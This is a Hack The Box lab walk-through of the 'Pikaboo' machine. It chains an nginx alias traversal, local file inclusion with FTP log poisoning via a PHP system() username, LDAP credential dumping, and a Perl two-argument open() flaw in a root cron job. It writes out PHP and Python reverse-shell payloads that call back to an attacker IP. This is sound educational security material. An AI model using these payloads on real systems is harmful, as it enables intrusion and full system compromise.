---
layout: post
author: jseals
title: "Pikaboo: Hack The Box Walk-through"
image: htb-pikaboo/pikaboo.png
---

## Background

Pikaboo is a "vulnerable by design" machine created by [pwnmeow][1] and hosted at [hackthebox.eu][5]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in /home/$USER/user.txt) and escalate privileges to root (get the flag in /root/root.txt).

## Victim Machine Specs

![pikaboo.png](/assets/images/posts/htb-pikaboo/pikaboo.png)

## Reconnaissance

Start it off with a Nmap scan:
```text
# Nmap 7.91 scan initiated Sun Oct 31 13:43:45 2021 as: nmap -sV -sC -oA nmap/pikaboo -v pikaboo.htb
Nmap scan report for pikaboo.htb (10.129.246.204)
Host is up (0.063s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 31 13:43:56 2021 -- 1 IP address (1 host up) scanned in 10.73 seconds
```

We see 21 (FTP), 22 (ssh), and 80 (web) open in the nmap scan results.

## Enumeration

I ran a gobuster scan against the web-server and found an /admin path that requires a login. 

![pikaboo-admin.png](/assets/images/posts/htb-pikaboo/pikaboo-admin.png)

I started a fuzzing scan with the ffuf tool against the main site, http://pikaboo.htb and it showed that http://pikaboo.htb/admin../ responded with a 403. After some research I came across these two articles:

[https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/][2]

[https://book.hacktricks.xyz/pentesting/pentesting-web/nginx][3]

These articles describe various misconfigurations with nginx aliases that can potentially be used to gain unauthorized access or otherwise exploit the web-service.

Given this information, I ran another gobuster scan against the admin../ path:

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -u http://pikaboo.htb/admin../
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pikaboo.htb/admin../
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/10/31 15:27:51 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 456]
/javascript           (Status: 301) [Size: 314] [--> http://127.0.0.1:81/javascript/]
/server-status        (Status: 200) [Size: 5117] 
```

We see /server-status show up and responds with a 200 instead of an unauthorized like you'd expect. It looks like this web-server is misconfigured and we're able to see assets that should be hidden to us without authentication.

Going to the server-status path, we see the following:

![pikaboo-server-status.png](/assets/images/posts/htb-pikaboo/pikaboo-server-status.png)

Looking through the data on this page, we're able to see an interesting GET request in the list:

```text
GET /admin_staging HTTP/1.1
```

Another gobuster scan on the new /admin_staging path reveals a index.php file among other paths and files:

```
http://pikaboo.htb/admin../admin_staging/index.php
```

Going to this URL provides us with what looks like an admin dashboard:

![pikaboo-admin-staging.png](/assets/images/posts/htb-pikaboo/pikaboo-admin-staging.png)

Looking around the admin_staging dashboard, I don't see much, but when going to the user profile or dashboard page, I noticed it was adding my current page as a URL parameter like this:

```
http://pikaboo.htb/admin../admin_staging/index.php?page=dashboard.php
```

This could be vulnerable to a number of things including LFI, so let's fuzz the parameter.

## Foothold

ffuf is my new favorite fuzzing tool, so let's run it against that URL page parameter we noticed:

```
[/usr/share/seclists/Discovery/Web-Content] λ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://pikaboo.htb/admin../admin_staging/index.php\?page\=FUZZ -mc 200 -c -v -fw 3272

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response words: 3272
________________________________________________

[Status: 200, Size: 19803, Words: 3893, Lines: 414]
| URL | http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
    * FUZZ: /var/log/vsftpd.log

[Status: 200, Size: 174325, Words: 3286, Lines: 558]
| URL | http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/wtmp
    * FUZZ: /var/log/wtmp

:: Progress: [914/914] :: Job [1/1] :: 633 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

We get two 200 responses. I am able to point the page parameter to the value of /var/log/vsftpd.log and retrieve the server's FTP log. 

![pikaboo-vsftpd-log.png](/assets/images/posts/htb-pikaboo/pikaboo-vsftpd-log.png)

Remember, we saw port 21 was open earlier. I ran some sed-fu on the file to clean it up and we're left with this:

```
Thu Jul 8 17:17:47 2021 [pid 14106] CONNECT: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:17:47 2021 [pid 14106] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:17:49 2021 [pid 14106] FTP command: Client "::ffff:10.10.14.6", "USER anonymous" 
Thu Jul 8 17:17:49 2021 [pid 14106] [anonymous] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password." 
Thu Jul 8 17:17:49 2021 [pid 14106] [anonymous] FTP command: Client "::ffff:10.10.14.6", "PASS " 
Thu Jul 8 17:17:49 2021 [pid 14105] [anonymous] FAIL LOGIN: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:17:50 2021 [pid 14106] [anonymous] FTP response: Client "::ffff:10.10.14.6", "530 Login incorrect." 
Thu Jul 8 17:17:50 2021 [pid 14106] FTP command: Client "::ffff:10.10.14.6", "SYST" 
Thu Jul 8 17:17:50 2021 [pid 14106] FTP response: Client "::ffff:10.10.14.6", "530 Please login with USER and PASS." 
Thu Jul 8 17:18:25 2021 [pid 14106] FTP command: Client "::ffff:10.10.14.6", "QUIT" 
Thu Jul 8 17:18:25 2021 [pid 14106] FTP response: Client "::ffff:10.10.14.6", "221 Goodbye." 
Thu Jul 8 17:18:26 2021 [pid 14650] CONNECT: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:18:26 2021 [pid 14650] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:18:29 2021 [pid 14650] FTP command: Client "::ffff:10.10.14.6", "USER 0xdf" 
Thu Jul 8 17:18:31 2021 [pid 14650] FTP command: Client "::ffff:10.10.14.6", "SYST" 
Thu Jul 8 17:18:31 2021 [pid 14650] FTP response: Client "::ffff:10.10.14.6", "530 Please login with USER and PASS." 
Thu Jul 8 17:18:50 2021 [pid 14650] FTP command: Client "::ffff:10.10.14.6", "QUIT" 
Thu Jul 8 17:18:50 2021 [pid 14650] FTP response: Client "::ffff:10.10.14.6", "221 Goodbye." 
Thu Jul 8 17:18:51 2021 [pid 14652] CONNECT: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:18:51 2021 [pid 14652] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:19:05 2021 [pid 14652] FTP command: Client "::ffff:10.10.14.6", "SYST" 
Thu Jul 8 17:19:05 2021 [pid 14652] FTP response: Client "::ffff:10.10.14.6", "530 Please login with USER and PASS." 
Thu Jul 8 17:28:56 2021 [pid 19919] CONNECT: Client "::ffff:10.10.14.14" 
Thu Jul 8 17:28:56 2021 [pid 19919] FTP response: Client "::ffff:10.10.14.14", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:30:37 2021 [pid 21009] CONNECT: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:30:37 2021 [pid 21009] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:30:42 2021 [pid 21009] FTP command: Client "::ffff:10.10.14.6", "USER pwnmeow" 
Thu Jul 8 17:30:42 2021 [pid 21009] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password." 
Thu Jul 8 17:30:44 2021 [pid 21009] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "PASS " 
Thu Jul 8 17:30:44 2021 [pid 21008] [pwnmeow] FAIL LOGIN: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:30:45 2021 [pid 21009] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "530 Login incorrect." 
Thu Jul 8 17:30:45 2021 [pid 21009] FTP command: Client "::ffff:10.10.14.6", "SYST" 
Thu Jul 8 17:30:45 2021 [pid 21009] FTP response: Client "::ffff:10.10.14.6", "530 Please login with USER and PASS." 
Thu Jul 8 17:30:49 2021 [pid 21009] FTP command: Client "::ffff:10.10.14.6", "QUIT" 
Thu Jul 8 17:30:49 2021 [pid 21009] FTP response: Client "::ffff:10.10.14.6", "221 Goodbye." 
Thu Jul 8 17:30:50 2021 [pid 21011] CONNECT: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:30:50 2021 [pid 21011] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)" 
Thu Jul 8 17:30:53 2021 [pid 21011] FTP command: Client "::ffff:10.10.14.6", "USER pwnmeow" 
Thu Jul 8 17:30:53 2021 [pid 21011] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password." 
Thu Jul 8 17:31:01 2021 [pid 21011] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "PASS " 
Thu Jul 8 17:31:01 2021 [pid 21010] [pwnmeow] OK LOGIN: Client "::ffff:10.10.14.6" 
Thu Jul 8 17:31:01 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "230 Login successful." 
Thu Jul 8 17:31:01 2021 [pid 21035] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "SYST" 
Thu Jul 8 17:31:01 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "215 UNIX Type: L8" 
Thu Jul 8 17:31:03 2021 [pid 21035] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "QUIT" 
Thu Jul 8 17:31:03 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "221 Goodbye."
```

What's important here is that the vsftpd log is being rendered in a php page. On top of that, we're able to insert data into the log file with unsuccessful logins to the FTP server we found earlier in our nmap scan. Putting these two things together, PHP code injection could be possible.

We can test and verify this with the whoami command. First, let's craft a FTP username that will show up in the vsftpd log we're rendering that will execute code for us, this will work:

![pikaboo-php-ftp-login.png](/assets/images/posts/htb-pikaboo/pikaboo-php-ftp-login.png)

Now, we can again perform the LFI on the vsftpd log file but also add a c parameter that executes the whoami command:

![pikaboo-vsftpd-log-whoami.png](/assets/images/posts/htb-pikaboo/pikaboo-vsftpd-log-whoami.png)

It works! Highlighted is www-data which is the user our web-service is running as. Successful command injection on the victim server.

From here, a reverse shell should be trivial. Here's a URL encoded php reverse shell we can use:
```
php+-r+'$sock%3dfsockopen("10.10.14.51",9001)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
```

Start up the nc listener on port 9001, (10.10.14.51 is our attacker IP), create a failed login attempt to ftp again with "<?php system($_GET['c']); ?>" as the username like we did before since the log keeps getting reset, and finally goto the URL with our reverse shell as the value of the c parameter like this:

```
http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=php+-r+%27$sock%3dfsockopen(%2210.10.14.51%22,9001)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27
```

We catch the reverse shell as the www-data user:

![pikaboo-rev-shell.png](/assets/images/posts/htb-pikaboo/pikaboo-rev-shell.png)

## User

The www-data group has read access to the user flag, so we user access is considered completed for this box:
```
$ cat /home/pwnmeow/user.txt
310428ab581d40317--truncated--
```

I move linpeas.sh, the linux privilege escalation helper script over to the victim and run it as the www-data user. It found an interesting cron job running on the machine every minute and also as the root user:
```
$ cat  /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

It looks to be running something called csvupdate on every file in /srv/ftp. www-data doesn't have permissions to write files to /srv/ftp/ directories, but the ftp group does.

We see csvupdate is a perl script:
```
$ ls -lah /usr/local/bin/csvupdate
-rwxr--r-- 1 root root 6.3K Jun  1 10:55 /usr/local/bin/csvupdate
$ file /usr/local/bin/csvupdate
/usr/local/bin/csvupdate: Perl script text executable
```

Here's the script itself:
```
$ cat /usr/local/bin/csvupdate
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  'abilities' => 4,
  'ability_changelog' => 3,
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4,
  'ability_names' => 3,
  'ability_prose' => 4,
  'berries' => 10,
  'berry_firmness' => 2,
  'berry_firmness_names' => 3,
  'berry_flavors' => 3,
  'characteristics' => 3,
  'characteristic_text' => 3,
  'conquest_episode_names' => 3,
  'conquest_episodes' => 2,
  'conquest_episode_warriors' => 2,
  'conquest_kingdom_names' => 3,
  'conquest_kingdoms' => 3,
  'conquest_max_links' => 3,
  'conquest_move_data' => 7,
  'conquest_move_displacement_prose' => 5,
  'conquest_move_displacements' => 3,
  'conquest_move_effect_prose' => 4,
  'conquest_move_effects' => 1,
  'conquest_move_range_prose' => 4,
  'conquest_move_ranges' => 3,
  'conquest_pokemon_abilities' => 3,
  'conquest_pokemon_evolution' => 8,
  'conquest_pokemon_moves' => 2,
  'conquest_pokemon_stats' => 3,
  'conquest_stat_names' => 3,
  'conquest_stats' => 3,
  'conquest_transformation_pokemon' => 2,
  'conquest_transformation_warriors' => 2,
  'conquest_warrior_archetypes' => 2,
  'conquest_warrior_names' => 3,
  'conquest_warrior_ranks' => 4,
  'conquest_warrior_rank_stat_map' => 3,
  'conquest_warriors' => 4,
  'conquest_warrior_skill_names' => 3,
  'conquest_warrior_skills' => 2,
  'conquest_warrior_specialties' => 3,
  'conquest_warrior_stat_names' => 3,
  'conquest_warrior_stats' => 2,
  'conquest_warrior_transformation' => 10,
  'contest_combos' => 2,
  'contest_effect_prose' => 4,
  'contest_effects' => 3,
  'contest_type_names' => 5,
  'contest_types' => 2,
  'egg_group_prose' => 3,
  'egg_groups' => 2,
  'encounter_condition_prose' => 3,
  'encounter_conditions' => 2,
  'encounter_condition_value_map' => 2,
  'encounter_condition_value_prose' => 3,
  'encounter_condition_values' => 4,
  'encounter_method_prose' => 3,
  'encounter_methods' => 3,
  'encounters' => 7,
  'encounter_slots' => 5,
  'evolution_chains' => 2,
  'evolution_trigger_prose' => 3,
  'evolution_triggers' => 2,
  'experience' => 3,
  'genders' => 2,
  'generation_names' => 3,
  'generations' => 3,
  'growth_rate_prose' => 3,
  'growth_rates' => 3,
  'item_categories' => 3,
  'item_category_prose' => 3,
  'item_flag_map' => 2,
  'item_flag_prose' => 4,
  'item_flags' => 2,
  'item_flavor_summaries' => 3,
  'item_flavor_text' => 4,
  'item_fling_effect_prose' => 3,
  'item_fling_effects' => 2,
  'item_game_indices' => 3,
  'item_names' => 3,
  'item_pocket_names' => 3,
  'item_pockets' => 2,
  'item_prose' => 4,
  'items' => 6,
  'language_names' => 3,
  'languages' => 6,
  'location_area_encounter_rates' => 4,
  'location_area_prose' => 3,
  'location_areas' => 4,
  'location_game_indices' => 3,
  'location_names' => 4,
  'locations' => 3,
  'machines' => 4,
  'move_battle_style_prose' => 3,
  'move_battle_styles' => 2,
  'move_changelog' => 10,
  'move_damage_classes' => 2,
  'move_damage_class_prose' => 4,
  'move_effect_changelog' => 3,
  'move_effect_changelog_prose' => 3,
  'move_effect_prose' => 4,
  'move_effects' => 1,
  'move_flag_map' => 2,
  'move_flag_prose' => 4,
  'move_flags' => 2,
  'move_flavor_summaries' => 3,
  'move_flavor_text' => 4,
  'move_meta_ailment_names' => 3,
  'move_meta_ailments' => 2,
  'move_meta_categories' => 2,
  'move_meta_category_prose' => 3,
  'move_meta' => 13,
  'move_meta_stat_changes' => 3,
  'move_names' => 3,
  'moves' => 15,
  'move_target_prose' => 4,
  'move_targets' => 2,
  'nature_battle_style_preferences' => 4,
  'nature_names' => 3,
  'nature_pokeathlon_stats' => 3,
  'natures' => 7,
  'pal_park_area_names' => 3,
  'pal_park_areas' => 2,
  'pal_park' => 4,
  'pokeathlon_stat_names' => 3,
  'pokeathlon_stats' => 2,
  'pokedexes' => 4,
  'pokedex_prose' => 4,
  'pokedex_version_groups' => 2,
  'pokemon_abilities' => 4,
  'pokemon_color_names' => 3,
  'pokemon_colors' => 2,
  'pokemon' => 8,
  'pokemon_dex_numbers' => 3,
  'pokemon_egg_groups' => 2,
  'pokemon_evolution' => 20,
  'pokemon_form_generations' => 3,
  'pokemon_form_names' => 4,
  'pokemon_form_pokeathlon_stats' => 5,
  'pokemon_forms' => 10,
  'pokemon_form_types' => 3,
  'pokemon_game_indices' => 3,
  'pokemon_habitat_names' => 3,
  'pokemon_habitats' => 2,
  'pokemon_items' => 4,
  'pokemon_move_method_prose' => 4,
  'pokemon_move_methods' => 2,
  'pokemon_moves' => 6,
  'pokemon_shape_prose' => 5,
  'pokemon_shapes' => 2,
  'pokemon_species' => 20,
  'pokemon_species_flavor_summaries' => 3,
  'pokemon_species_flavor_text' => 4,
  'pokemon_species_names' => 4,
  'pokemon_species_prose' => 3,
  'pokemon_stats' => 4,
  'pokemon_types' => 3,
  'pokemon_types_past' => 4,
  'region_names' => 3,
  'regions' => 2,
  'stat_names' => 3,
  'stats' => 5,
  'super_contest_combos' => 2,
  'super_contest_effect_prose' => 3,
  'super_contest_effects' => 2,
  'type_efficacy' => 3,
  'type_game_indices' => 3,
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```

I'm not too familiar with perl, but after some research I found that perl has some interesting problems with the open function. Many are documented here:

[https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543][4]

This code suffers from the same vulnerability as the first noncompliant code example in the above link. The `<ARGV>` operator opens every file provided in the `@ARGV` array and returns a line from each file. Unfortunately, it uses the two-argument form of `open()` to accomplish this task. If any element of `@ARGV` begins or ends with `|`, it is interpreted as a shell command and executed.

Since this is new to me, I made a simple perl script to test with:
```
[/home/gn0stic/htb/pikaboo] λ cat perl-test.pl                             
#!/usr/bin/perl

while (<ARGV>) {
  print ":: $_";
};
[/home/gn0stic/htb/pikaboo] λ ./perl-test.pl |whoami                       
gn0stic
```

Interesting, it does in fact execute our shell commands. It seems like we have the path forward, but first we need to login or get the pwnmeow's password as he's in the ftp group and can write arbitrary files to the /srv/ftp/ directory, that the vulnerably perl script will then execute for us.

I just perform a recursive grep for pass to see if anything comes up:
Grep for pass recursively:
```
www-data@pikaboo:/opt/pokeapi$ grep -ri pass *
```

We get a couple hits, the first is some pokeapi password and the second is some type of LDAP password:
```
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
```

Running netstat -tulpn as the www-data user shows that the LDAP port is opened only on localhost, so that explains why our external nmap scan didn't see it open. To get easier access to the local LDAP port, let's use socat for a local port forward:
```
[/home/gn0stic/htb/tools/bin] λ ./socat TCP4-LISTEN:6666,fork,reuseaddr TCP4:127.0.0.1:389
```

Now, let's enumerate ldap with ldapsearch:
```
[/home/gn0stic/htb/tools/bin] λ ldapsearch -x -h pikaboo.htb:6666 -b "dc=pikaboo,dc=htb" "objectclass=*" -w "J~42%W?PFHl]g" -D "cn=binduser,ou=users,dc=pikaboo,dc=htb"

# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: objectclass=*
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
```

We see the pwnmeow user gets dumped along with looks to be a base64 encoded password:
```
[/home/gn0stic/htb/tools/bin] λ echo -n "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" |base64 -d 
_G0tT4_C4tcH_'3m_4lL!_%
```

## Root

Keeping with the poki / poke theme, we get pwnmeow's password. I tried to ssh in as pwnmeow using that password but it didn't work. However, loging in to the FTP server with the credentials does work.

The way the perl script works is that our payload needs to be the actual filename, not the contents of the file. So I made the filename a python reverse shell that will connect back to us:
```
ls
'|python -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.51",9005));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")'\'';.csv'
```

Note, the cron job also only executes against files that end in .csv. Now, first we need to start up a nc listener to catch the shell, then we upload this file via ftp using pwnmeow's credentials and wait for the perl script to run as root via the cronjob we found:
```
[/home/gn0stic/htb/pikaboo] λ nc -lvp 9005
listening on [any] 9005 ...
connect to [10.10.14.51] from pikaboo.htb [10.129.247.66] 56702
root@pikaboo:/srv/ftp/versions# whoami
whoami
root
root@pikaboo:/srv/ftp/versions# cat /root/root.txt
cat /root/root.txt
546135ae9700af11bf--truncated--
```

All works according to plan, we get a reverse shell as the root user and are able to access the root flag. The box is fully compromised.

[1]: https://app.hackthebox.com/users/157669
[2]: https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
[3]: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx
[4]: https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543
[5]: https://www.hackthebox.eu